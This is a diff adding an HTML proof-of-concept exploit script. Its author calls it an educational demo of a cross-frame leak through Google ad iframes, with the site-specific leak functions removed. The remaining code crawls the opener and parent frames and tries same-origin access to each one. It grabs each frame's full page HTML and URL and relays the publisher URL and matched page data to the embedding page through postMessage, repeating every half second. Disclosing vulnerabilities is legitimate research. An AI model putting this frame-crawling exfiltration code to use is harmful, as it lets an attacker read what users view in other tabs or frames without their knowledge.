@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<!--
+This was a terrible POC just to demo the exploit. Don't execpt good or even
+consistent code here. It is being shared only for the sake of education. The
+basic window.opener/iframe cralling function here was also used in other
+vulnerabilities. It can even function as a bypass to some firefox protections
+if XSS is found in a iframe.
+
+Much of the code here has been removed to protect the innocent :)
+-->
+<meta charset=utf-8>
+<script>
+SEENTIT = true;
+function sendMsg(msg){
+	window.parent.postMessage(msg, "*");
+}
+
+console.debug(`Running in DOMAIN: ${document.domain}`); // tpc.googlesyndication.com
+// console.log("contents of localStorage");
+// console.dir(localStorage);
+
+var searches = [
+/*
+ * CODE REMOVED
+ *
+ * Each domain hosting ads does it differently. This is why it was so hard for
+ * google to get this fixed. This also meant each leak worked differently. So
+ * previously this section had a different leaking function for nearly every
+ * page I found hosting google ads. Each leak in the POC video was a function here.
+ */
+];
+
+function attackFrame(f){
+  /*
+   * exfiltrate the document
+  */
+  if (typeof f.SEENTIT !== 'undefined') {
+    return;
+  } else {
+    f.SEENTIT = true;
+  }
+
+  let txt = f.document.documentElement.innerHTML;
+  let url = f.document.URL;
+
+	console.groupCollapsed(`DOM TEXT ${url} ${txt.length}`);
+	console.log(txt);
+	console.groupEnd();
+
+  // seen in a lot of places
+  if (f.ucTagData) {
+    /* console.dir(f.ucTagData); */
+    let u = new URL(f.ucTagData.pubUrl);
+    console.info(`FULL URL: ${u.toString()}`);
+    sendMsg({loc: u.host, url: u.toString()});
+    return true;
+  }
+  console.dir(f);
+
+  for (let needle of searches){
+    let search = needle[1];
+    let disp = needle[0];
+    let func = needle.length == 3 ? needle[2] : null;
+    if (txt.toLowerCase().includes(search)){
+      if (func) {
+        func(txt);
+      } else {
+        console.info(`Other Tab is on ${disp}`);
+        sendMsg({loc: disp})
+      }
+    }
+  }
+  // rickroll other page
+  // f.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+}
+
+
+function frameFriends(papa){
+  if (papa.length <= 0) {
+    return;
+  }
+
+  // given a frame find all subframes we can be friends with
+  for (let i=0; i<papa.length;i++ ){ // array-like to search for same origin frame
+    try {
+      // succeeds if frame is same origin with this one
+      attackFrame(papa[i]);
+    }catch (err){
+      let s = String(err);
+      if (!s.includes("SecurityError: Permission denied to") && !s.includes("Blocked a frame with") ) {
+        console.log(s);
+      }
+      frameFriends(papa[i]);
+    };
+  }
+}
+
+function findLegitFrame(){
+  // was my framer opened
+  if ( window.parent.opener )
+    return [ window.parent.opener ];
+
+  // is there a frame other then me in top
+  let frames = window.parent.frames;
+  let ret = [];
+  for (i=0; i<frames.length; i++){
+    if ( frames[i] != window ) {
+      ret.push(frames[i]);
+    }
+  }
+  return ret;
+}
+
+function simple(){
+  let frames = findLegitFrame();
+  if (frames) {
+    frameFriends(frames[0].frames, 0);
+  }
+}
+
+
+setInterval(simple, 500);
+
+window.addEventListener('message', msg => {
+    simple();
+});
+
+</script>
+</html>
